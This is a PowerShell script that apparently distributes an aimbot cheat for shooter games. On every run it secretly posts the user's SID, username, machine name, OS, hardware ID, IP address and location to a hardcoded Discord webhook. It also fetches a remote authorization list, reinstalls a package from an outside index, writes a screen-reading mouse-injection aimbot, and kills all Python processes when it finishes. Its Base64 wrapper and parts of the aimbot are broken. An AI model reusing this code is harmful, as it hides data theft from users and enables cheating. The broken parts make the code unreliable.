$payload = 'Clear-Host

# ==================== SID COLLECTION ====================
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
}
catch {
    Write-Host "[!] Failed to get SID: $_" -ForegroundColor Red
    $sid = "Unavailable"
}

# ==================== WEBHOOK BLOCK ====================
$webhookUrl = "https://discord.com/api/webhooks/1386747730805788702/RsDq69wUXgHVExgQTSiXAAXIG9iI3Xv_GJnEmqT4H2zLJ7BCpM4vLQksbauN6M94fJho"

function Send-WebhookMessage {
    param(
        [string]$message,
        [string]$status = "info"
    )
    
    try {
        $user = $env:USERNAME
        $pcName = $env:COMPUTERNAME
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
        $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
        $hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""

        try {
            $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
            $ip = $ipInfo.query
            $country = $ipInfo.country
            $region = $ipInfo.regionName
            $city = $ipInfo.city
        }
        catch {
            $ip = "Unavailable"
            $country = "Unavailable"
            $region = "Unavailable"
            $city = "Unavailable"
        }

        $color = switch ($status) {
            "success" { 65280 }   # Green
            "error"   { 16711680 } # Red
            "warning" { 16776960 } # Yellow
            default   { 4886754 }  # Blue
        }

        $embed = @{
            title = "<:Dead:1346705076626002033> SageX Executed - $status".ToUpper()
            color = $color
            timestamp = (Get-Date).ToString("o")
            fields = @(
                @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
                @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
                @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
                @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
                @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false },
                @{ name = "Status Message"; value = $message; inline = $false }
            )
        }

        $payload = @{
            username = "SageX Logger"
            embeds = @($embed)
        } | ConvertTo-Json -Depth 10

        $headers = @{
            "Content-Type" = "application/json"
        }

        $webhookResponse = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -Headers $headers -ErrorAction Stop
        return $true
    }
    catch {
        if ($_.Exception.Response -and $_.Exception.Response.StatusCode -eq 429) {
            $retryAfter = $_.Exception.Response.Headers['Retry-After']
        }
        return $false
    }
}

$webhookTest = Send-WebhookMessage -message "Initial connection test" -status "info"
if (-not $webhookTest) {
    Write-Host "[!] Webhook initialization failed. Continuing without webhook logging." -ForegroundColor Yellow
}

# ==================== OTP VERIFICATION ====================
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Get-MachineFingerprint {
    try {
        $cpuId = (Get-WmiObject Win32_Processor -ErrorAction Stop).ProcessorId
        $biosId = (Get-WmiObject Win32_BIOS -ErrorAction Stop).SerialNumber
        $diskId = (Get-WmiObject Win32_DiskDrive -ErrorAction Stop).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration -ErrorAction Stop | 
                      Where-Object { $_.IPEnabled -eq $true }).MacAddress | Select-Object -First 1
        
        $combinedId = "$cpuId$biosId$diskId$macAddress"
        $hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($combinedId))
        $hashedId = [System.BitConverter]::ToString($hash) -replace "-", ""
        
        return $hashedId.Substring(0, 32)
    }
    catch {
        $errorMsg = "Error generating machine fingerprint: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

function Generate-SecureOTP {
    param([int]$Length = 12)
    
    try {
        $validChars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $bytes = New-Object byte[]($Length)
        $rng.GetBytes($bytes)
        
        $otp = -join ($bytes | ForEach-Object {
            $validChars[$_ % $validChars.Length]
        })
        
        return $otp
    }
    catch {
        $errorMsg = "Error generating OTP: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

function Verify-OTP {
    param(
        [string]$MachineFingerprint,
        [string]$OTP,
        [string]$DatabaseURL
    )
    
    try {
        $maxRetries = 3
        $retryCount = 0
        $remoteData = $null
        
        do {
            try {
                $remoteData = Invoke-RestMethod -Uri $DatabaseURL -UseBasicParsing -ErrorAction Stop -ContentType "text/plain; charset=utf-8"
                break
            }
            catch {
                $retryCount++
                if ($retryCount -ge $maxRetries) {
                    throw "Failed to fetch OTP database after $maxRetries attempts: $_"
                }
                Start-Sleep -Seconds 5
            }
        } while ($true)

        if ([string]::IsNullOrEmpty($remoteData)) {
            $warningMsg = "Empty OTP database received"
            Write-Host "[!] $warningMsg" -ForegroundColor Yellow
            Send-WebhookMessage -message $warningMsg -status "warning"
            return $false
        }
        
        $pattern = "$MachineFingerprint`:$OTP`:\d{4}-\d{2}-\d{2}"
        return ($remoteData -match $pattern)
    }
    catch {
        $errorMsg = "Failed to verify OTP: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        return $false
    }
}

function Initialize-OTPSystem {
    try {
        $appDataFolder = "$env:APPDATA\SAGEx REGEDIT"
        if (-not (Test-Path $appDataFolder)) {
            New-Item -ItemType Directory -Path $appDataFolder -Force | Out-Null
        }
        
        $LocalStoragePath = "$appDataFolder\otp.ini"
        $RemoteDatabaseURL = "https://raw.githubusercontent.com/Toxic-Speed/SAG--X/main/otp_db.txt"
        $machineFingerprint = Get-MachineFingerprint
        
        if (Test-Path $LocalStoragePath) {
            $localOTP = Get-Content $LocalStoragePath | Where-Object { $_ -match '^otp=' } | ForEach-Object { ($_ -split '=')[1] }
            
            if ([string]::IsNullOrEmpty($localOTP)) {
                throw "No OTP found in local storage"
            }
            
            if (-not (Verify-OTP -MachineFingerprint $machineFingerprint -OTP $localOTP -DatabaseURL $RemoteDatabaseURL)) {
                $errorMsg = "Device not authorized. Fingerprint: $machineFingerprint | OTP: $localOTP"
                Write-Host "`n[!] $errorMsg" -ForegroundColor Red
                Send-WebhookMessage -message $errorMsg -status "error"
                Write-Host "[!] Please contact support." -ForegroundColor Red
                Start-Sleep 15
                exit
            }
            
            Send-WebhookMessage -message "OTP verification successful" -status "success"
            return $true
        }
        else {
            $newOTP = Generate-SecureOTP -Length 12
            $otpContent = @(
                "[OTP]",
                "fingerprint=$machineFingerprint",
                "otp=$newOTP",
                "generated=$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            )
            
            $otpContent | Out-File -FilePath $LocalStoragePath -Force -Encoding UTF8
            $warningMsg = "FIRST-TIME SETUP REQUIRED. Fingerprint: $machineFingerprint | OTP: $newOTP"
            Write-Host "`n[!] $warningMsg" -ForegroundColor Yellow
            Send-WebhookMessage -message $warningMsg -status "warning"
            Write-Host "`n[!] Please register this device with the information above" -ForegroundColor Yellow
            Write-Host "[!] Send this information to the developer" -ForegroundColor Yellow
            Write-Host "`n[*] Exiting until device is authorized..." -ForegroundColor Gray
            Start-Sleep 10
            exit
        }
    }
    catch {
        $errorMsg = "OTP System Error: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

Initialize-OTPSystem
Clear-Host

# ==================== HYPERVIGILANT AIMBOT ====================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class Win32Functions {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    
    [DllImport("kernel32.dll")]
    public static extern bool AllocConsole();
}
"@

$appDataDir = Join-Path $env:APPDATA "SAGEx REGEDIT"
$tempPy = Join-Path $appDataDir "SAGEx REGEDIT.py"
$modelFile = "yolov8n.pt"
$modelHash = "31E20DDE3DEF09E2CF938C7BE6FE23D9150BBBE503982AF13345706515F2EF95"
$modelUrl = "https://github.com/ultralytics/assets/releases/download/v0.0.0/yolov8n.pt"

if (-not (Test-Path $appDataDir)) {
    New-Item -ItemType Directory -Path $appDataDir -Force | Out-Null
}

function Show-Console {
    try {
        if (-not [Win32Functions]::AllocConsole()) {
            $consoleWindow = [Win32Functions]::GetConsoleWindow()
            if ($consoleWindow -ne [IntPtr]::Zero) {
                [Win32Functions]::ShowWindow($consoleWindow, 5) | Out-Null
            }
        }
    }
    catch {
        Write-Warning "Could not show console window: $_"
    }
}

function Test-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Install-Packages {
    $packages = @(
        "ultralytics",
        "mss",
        "pyautogui",
        "opencv-python",
        "pywin32"
    )
    
    Write-Host "[+] Checking Python packages..." -ForegroundColor Cyan
    
    try { 
        $null = & python -m pip --version 
    }
    catch {
        Write-Host "[-] pip not found. Installing pip..." -ForegroundColor Yellow
        & python -m ensurepip --default-pip
    }
    
    Write-Host "  - Installing PySimpleGUI from private server..." -ForegroundColor Yellow
    & python -m pip uninstall PySimpleGUI -y 2>&1 | Out-Null
    & python -m pip cache purge 2>&1 | Out-Null
    & python -m pip install --force-reinstall --extra-index-url https://PySimpleGUI.net/install PySimpleGUI 2>&1 | Out-Null
    
    foreach ($pkg in $packages) {
        Write-Host "  - Checking $pkg..." -NoNewline
        try {
            $installed = & python -c "import $pkg" 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-Host " OK" -ForegroundColor Green
            }
            else {
                throw
            }
        }
        catch {
            Write-Host " Installing..." -ForegroundColor Yellow
            & python -m pip install $pkg --quiet --disable-pip-version-check
        }
    }
}

function Test-Model {
    if (-not (Test-Path $modelFile)) { return $false }
    
    try {
        $hash = (Get-FileHash -Algorithm SHA256 -Path $modelFile).Hash
        return $hash -eq $modelHash
    }
    catch { return $false }
}

function Get-Model {
    Write-Host "[+] Downloading model..." -ForegroundColor Cyan
    try {
        Invoke-WebRequest -Uri $modelUrl -OutFile $modelFile -UseBasicParsing
        if (-not (Test-Model)) {
            Remove-Item $modelFile -Force
            throw "Model verification failed (Hash mismatch)"
        }
        return $true
    }
    catch {
        Write-Host "[-] Error downloading model: $_" -ForegroundColor Red
        return $false
    }
}

function Create-PythonScript {
@'
# SAGEx REGEDIT V4.2 - HyperVigilant Edition
import os
import sys
import cv2
import time
import ctypes
import numpy as np
import mss
import logging
import PySimpleGUI as sg
from ultralytics import YOLO
import win32api
import win32con
import winsound
import pyautogui
from PIL import Image, ImageTk
import threading
from collections import deque

# ================ HYPERVIGILANT CONFIG ================
HV_CONFIG = {
    "headshot_ratio": 0.11,            # Ultra-precise headshot ratio
    "head_offset_y": -12,              # Fine-tuned vertical adjustment
    "target_fps": 450,                 # Extreme processing FPS
    "scan_resolution": 512,            # Higher resolution for vigilance
    "aim_acceleration": 2.8,           # Faster initial aim
    "precision_boost": 0.35,           # Final precision adjustment
    "recoil_compensation": 4.5,        # Stronger recoil control
    "max_latency": 0.002,              # Extreme-low input delay (2ms)
    "dynamic_smoothing": True,         # Adaptive smoothness
    "prediction": True,                # Enhanced prediction
    "prediction_factor": 0.45,         # Stronger prediction
    "edge_detection": True,            # Edge detection for vigilance
    "contrast_boost": 1.5,             # Image contrast enhancement
    "vigilance_threshold": 0.68,       # Higher confidence threshold
    "min_head_size": 12,               # Minimum head size in pixels
    "max_head_size": 55,               # Maximum head size in pixels
    "head_width_multiplier": 0.75,     # Multiplier for head width
    "neck_offset": 6,                  # Neck position offset
    "ui_update_interval": 0.05,        # UI update interval in seconds (20ms)
    "detection_threads": 2             # Number of detection threads
}

# ================ ENHANCED UI THEME ================
sg.theme('DarkBlue3')
sg.set_options(font=('Helvetica', 11))

class AimbotConfig:
    def __init__(self):
        self.active = False
        self.confidence = 0.76
        self.smoothness = 0.18
        self.scan_interval = 0.004
        self.drag_delay = 0.003
        self.region_size = 450
        self.enable_sound = True
        self.last_targets = []
        self.target_history = deque(maxlen=5)
        self.update_screen_params()
        self.status = "INACTIVE"
        self.detection_status = "IDLE"
        self.current_fps = 0
        self.current_latency = 0
        self.target_count = 0
        self.last_ui_update = 0
        self.lock = threading.Lock()
        
    def update_screen_params(self):
        self.screen_width, self.screen_height = pyautogui.size()
        self.region_left = int(self.screen_width // 2 - self.region_size // 2)
        self.region_top = int(self.screen_height // 2 - self.region_size // 2)
        self.screen_region = {
            "top": self.region_top,
            "left": self.region_left,
            "width": self.region_size,
            "height": self.region_size
        }

# ================ HYPERVIGILANT UI ================
def create_gui():
    layout = [
        [sg.Text("SAGEx REGEDIT V4.2 - HyperVigilant-Edition", font=('Helvetica', 18, 'bold'), justification='center')],
        [sg.HorizontalSeparator(pad=(0, 10))],
        [
            sg.Frame('Detection Settings', [
                [sg.Text('Confidence Threshold:', size=18),
                 sg.Slider((0.5, 0.9), 0.76, 0.01, orientation='h', key='-CONFIDENCE-', size=(25,15))],
                [sg.Text('Smoothness:', size=18),
                 sg.Slider((0.1, 0.4), 0.18, 0.01, orientation='h', key='-SMOOTHNESS-', size=(25,15))],
                [sg.Text('Scan Region:', size=18),
                 sg.Slider((200, 600), 450, 10, orientation='h', key='-REGION-', size=(25,15), enable_events=True)],
                [sg.Checkbox('Enable Sound', default=True, key='-SOUND-')]
            ], size=(300, 160)),
            
            sg.VerticalSeparator(),
            
            sg.Frame('Status Panel', [
                [sg.Text('Aimbot Status:', size=12), 
                 sg.Text('INACTIVE', key='-STATUS-', text_color='red', size=10, font=('Helvetica', 11, 'bold'))],
                [sg.Text('Detection Status:', size=12),
                 sg.Text('IDLE', key='-DETECTION-', text_color='yellow', size=10, font=('Helvetica', 11))],
                [sg.Button('TOGGLE AIMBOT (F6)', size=(18, 2), key='-TOGGLE-', button_color=('white', '#4CAF50'))],
                [sg.Button('EXIT (F8)', size=(18, 2), key='-EXIT-', button_color=('white', '#F44336'))]
            ], size=(300, 160))
        ],
        [sg.HorizontalSeparator(pad=(0, 10))],
        [
            sg.Frame('Performance', [
                [sg.Text('FPS:', size=10), sg.Text('0', key='-FPS-', size=8)],
                [sg.Text('Latency:', size=10), sg.Text('0ms', key='-LATENCY-', size=8)],
                [sg.Text('Targets:', size=10), sg.Text('0', key='-TARGETS-', size=8)]
            ], size=(200, 100)),
            
            sg.Frame('Detection Preview', [
                [sg.Image(filename='', key='-PREVIEW-', size=(200, 100))]
            ], size=(200, 100))
        ]
    ]
    
    window = sg.Window("SAGEx REGEDIT V4.2 - HyperVigilant Edition", 
                      layout, 
                      finalize=True, 
                      element_justification='center',
                      return_keyboard_events=True)
    
    # Set window to stay on top
    hwnd = ctypes.windll.user32.GetParent(window.TKroot.winfo_id())
    ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0001)
    
    return window

# ================ LIGHTNING FAST DETECTION ================
def enhance_image(img):
    # Ultra-fast image enhancement using optimized OpenCV operations
    if HV_CONFIG["contrast_boost"] > 1.0:
        lab = cv2.cvtColor(img, cv2.COLOR_BGR2LAB)
        l, a, b = cv2.split(lab)
        clahe = cv2.createCLAHE(clipLimit=3.0, tileGridSize=(4,4))  # Smaller grid for faster processing
        l = clahe.apply(l)
        img = cv2.merge((l,a,b))
        img = cv2.cvtColor(img, cv2.COLOR_LAB2BGR)
    
    if HV_CONFIG["edge_detection"]:
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        edges = cv2.Canny(gray, 60, 120)  # Optimized thresholds
        img = cv2.addWeighted(img, 0.7, cv2.cvtColor(edges, cv2.COLOR_GRAY2BGR), 0.3, 0)
    
    return img

def detect_targets(config, model, sct):
    try:
        # Grab screen with minimal overhead
        img = np.array(sct.grab(config.screen_region), dtype=np.uint8)
        img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
        
        # Fast resize and enhancement
        img = cv2.resize(img, (HV_CONFIG["scan_resolution"], HV_CONFIG["scan_resolution"]))
        img = enhance_image(img)
        
        # Ultra-fast detection with optimized parameters
        results = model(img, 
                      conf=max(config.confidence, HV_CONFIG["vigilance_threshold"]),
                      imgsz=HV_CONFIG["scan_resolution"],
                      half=True,
                      iou=0.4,
                      agnostic_nms=True,
                      verbose=False,
                      device='cpu')  # Using CPU for more consistent performance
        
        boxes = results[0].boxes.xyxy.cpu().numpy()
        classes = results[0].boxes.cls.cpu().numpy()
        confidences = results[0].boxes.conf.cpu().numpy()
        
        targets = []
        
        for i, box in enumerate(boxes):
            if int(classes[i]) == 0:  # Person class
                x1, y1, x2, y2 = map(int, box)
                body_width = x2 - x1
                
                # Hyper-precise head calculation
                head_width = min(max(int(body_width * HV_CONFIG["head_width_multiplier"]), 
                                HV_CONFIG["max_head_size"]), HV_CONFIG["min_head_size"])
                head_x = (x1 + x2) // 2
                head_y = y1 + int(head_width * HV_CONFIG["headshot_ratio"]) + HV_CONFIG["head_offset_y"] - (
                    HV_CONFIG["neck_offset"] if body_width > 25 else 0)
                
                # Convert to screen coords with sub-pixel precision
                scale = config.region_size / HV_CONFIG["scan_resolution"]
                screen_x = config.region_left + (head_x * scale)
                screen_y = config.region_top + (head_y * scale)
                
                targets.append({
                    'x': screen_x,
                    'y': screen_y,
                    'confidence': confidences[i],
                    'width': body_width
                })
        
        # Enhanced prediction with history
        if HV_CONFIG["prediction"] and targets and config.target_history:
            avg_movement = np.mean([
                (t['x'] - h['x'], t['y'] - h['y']) 
                for t, h in zip(targets, config.target_history[-1])
            ], axis=0)
            
            for target in targets:
                target['x'] += avg_movement[0] * HV_CONFIG["prediction_factor"]
                target['y'] += avg_movement[1] * HV_CONFIG["prediction_factor"]
        
        # Update target history
        if targets:
            config.target_history.append(targets)
        
        return targets, img
    
    except Exception as e:
        logging.error(f"Detection error: {str(e)}")
        return [], None

# ================ PRECISION AIMING ================
def precision_aim(config, target_x, target_y):
    try:
        start_time = time.perf_counter()
        cx, cy = pyautogui.position()
        dx = target_x - cx
        dy = target_y - cy
        distance = np.hypot(dx, dy)
        
        # Dynamic smoothing with optimized curve
        if HV_CONFIG["adaptive_smoothing"]:
            if distance > 180:
                smooth_factor = config.smoothness * 0.25
            elif distance > 80:
                smooth_factor = config.smoothness * 0.4
            elif distance > 30:
                smooth_factor = config.smoothness * 0.7
            else:
                smooth_factor = config.smoothness * 2.2
        
        steps = max(int(distance / smooth_factor), 1)
        
        # Optimized aiming loop
        for i in range(steps):
            if not win32api.GetAsyncKeyState(win32con.VK_LBUTTON) & 0x8000:
                return 0
            
            progress = i / steps
            accel = (HV_CONFIG["aim_acceleration"] * (1 - progress)**3 + 
                    HV_CONFIG["precision_boost"] * progress**3)
            
            mx = int(dx / steps * accel)
            my = int(dy / steps * accel)
            
            # Enhanced recoil compensation
            if HV_CONFIG["recoil_compensation"] and i % 2 == 0:
                my += int(HV_CONFIG["recoil_compensation"] * (1 + distance/400))
            
            win32api.mouse_event(0x0001, mx, my, 0, 0)
            time.sleep(max(config.drag_delay, HV_CONFIG["max_latency"]))
        
        # Final micro-adjustment
        remaining_x = target_x - pyautogui.position()[0]
        remaining_y = target_y - pyautogui.position()[1]
        if abs(remaining_x) > 0 or abs(remaining_y) > 0:
            win32api.mouse_event(0x0001, int(remaining_x), int(remaining_y), 0, 0)
        
        return (time.perf_counter() - start_time) * 1000
    
    except Exception as e:
        logging.error(f"Aiming error: {str(e)}")
        return 0

# ================ REAL-TIME PROCESSING ================
def process_aimbot(config, model, sct, window):
    fps_counter = 0
    last_fps_time = time.time()
    
    while True:
        start_time = time.perf_counter()
        
        # Process GUI events (non-blocking)
        event, values = window.read(timeout=0)
        if event in (sg.WIN_CLOSED, '-EXIT-') or win32api.GetAsyncKeyState(win32con.VK_F8) & 0x8000:
            break
        
        # Toggle aimbot
        if (event == '-TOGGLE-' or win32api.GetAsyncKeyState(win32con.VK_F6) & 0x8000):
            with config.lock:
                config.active = not config.active
                config.status = "ACTIVE" if config.active else "INACTIVE"
                if config.enable_sound:
                    winsound.Beep(1200 if config.active else 900, 80)
        
        # Update config
        with config.lock:
            config.confidence = float(values['-CONFIDENCE-'])
            config.smoothness = float(values['-SMOOTHNESS-'])
            if config.region_size != int(values['-REGION-']):
                config.region_size = int(values['-REGION-'])
                config.update_screen_params()
            config.enable_sound = bool(values['-SOUND-'])
        
        # Detection and aiming
        latency = 0
        if config.active and win32api.GetAsyncKeyState(win32con.VK_LBUTTON) & 0x8000:
            targets, detection_img = detect_targets(config, model, sct)
            
            with config.lock:
                config.target_count = len(targets)
                config.detection_status = "ACTIVE" if targets else "SCANNING"
                
                if targets:
                    best_target = max(targets, key=lambda x: x['confidence'])
                    latency = precision_aim(config, best_target['x'], best_target['y'])
                
                # Update preview image if available
                if detection_img is not None and time.time() - config.last_ui_update > HV_CONFIG["ui_update_interval"]:
                    preview = cv2.resize(detection_img, (200, 100))
                    cv2.drawMarker(preview, (100, 50), (0, 255, 0), 
                                  markerType=cv2.MARKER_CROSS, markerSize=20, thickness=1)
                    img_bytes = cv2.imencode('.png', preview)[1].tobytes()
                    window['-PREVIEW-'].update(data=img_bytes)
                    config.last_ui_update = time.time()
        
        # Performance metrics
        fps_counter += 1
        if time.time() - last_fps_time >= 0.5:  # Update FPS twice per second for smoother display
            with config.lock:
                config.current_fps = fps_counter / (time.time() - last_fps_time)
                config.current_latency = latency if latency > 0 else config.current_latency * 0.9
            fps_counter = 0
            last_fps_time = time.time()
        
        # UI updates
        if time.time() - config.last_ui_update > HV_CONFIG["ui_update_interval"]:
            with config.lock:
                window['-STATUS-'].update(
                    config.status, 
                    text_color='lime' if config.status == "ACTIVE" else 'red')
                window['-DETECTION-'].update(
                    config.detection_status,
                    text_color='lime' if config.detection_status == "ACTIVE" else 'yellow')
                window['-FPS-'].update(f"{config.current_fps:.0f}")
                window['-LATENCY-'].update(f"{config.current_latency:.1f}ms")
                window['-TARGETS-'].update(f"{config.target_count}")
                config.last_ui_update = time.time()
        
        # Precision sleep for consistent FPS
        elapsed = time.perf_counter() - start_time
        sleep_time = max(0, (1/HV_CONFIG["target_fps"]) - elapsed)
        if sleep_time > 0:
            time.sleep(sleep_time)

def main():
    window = None
    try:
        # Initialize
        config = AimbotConfig()
        model = YOLO("yolov8n.pt")
        window = create_gui()
        sct = mss.mss()
        
        # Start processing
        process_aimbot(config, model, sct, window)
        
    except Exception as e:
        logging.critical(f"Fatal error: {str(e)}")
        if window:
            window.close()
        raise

if __name__ == "__main__":
    main()
'@ | Out-File -FilePath $tempPy -Encoding utf8 -Force
}

try {
    Show-Console
    
    if (-not (Test-Admin)) {
        Write-Host "[!] Warning: Running without admin privileges" -ForegroundColor Yellow
    }
    
    Write-Host "[+] Checking Python..." -ForegroundColor Cyan
    try {
        $pythonVersion = (& python --version 2>&1 | Out-String).Trim()
        if (-not $pythonVersion -or $pythonVersion -match "not found") {
            throw "Python not found"
        }
        Write-Host "  - Found $pythonVersion" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Python is required. Install from https://www.python.org/" -ForegroundColor Red
        pause
        exit 1
    }
    
    Install-Packages
    
    if (-not (Test-Model)) {
        Write-Host "[!] Model not found or invalid. Downloading..." -ForegroundColor Yellow
        if (-not (Get-Model)) {
            Write-Host "[-] Failed to initialize model. Exiting..." -ForegroundColor Red
            pause
            exit 1
        }
    }
    Write-Host "[+] Model verified successfully!" -ForegroundColor Green
    
    Create-PythonScript
    
    Write-Host "[+] Launching SAGEx REGEDIT V4.2-HyperVigilant Edition..." -ForegroundColor Green
    & python $tempPy
    
    Write-Host "[+] Script completed successfully" -ForegroundColor Green
}
catch {
    Write-Host "[-] ERROR: $_" -ForegroundColor Red
    Write-Host "[-] Stack Trace: $($_.ScriptStackTrace)" -ForegroundColor DarkRed
    pause
}
finally {
    Write-Host "[+] Cleaning up..." -ForegroundColor Cyan
    function Force-RemoveSAGExFiles {
        $appDataFolder = "$env:APPDATA\SAGEx REGEDIT"
        $pythonScript = "$appDataFolder\SAGEx REGEDIT.py"

        if (Test-Path $pythonScript) {
            try {
                Get-Process python -ErrorAction SilentlyContinue | Stop-Process -Force
                Remove-Item -Path $pythonScript -Force -ErrorAction Stop
                Write-Host "[+] Successfully deleted SAGEx REGEDIT.py" -ForegroundColor Green
            }
            catch {
                Write-Host "[!] Failed to delete SAGEx REGEDIT.py: $_" -ForegroundColor Red
            }
        }
    }
    Force-RemoveSAGExFiles
}';
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
Invoke-Expression $decoded;
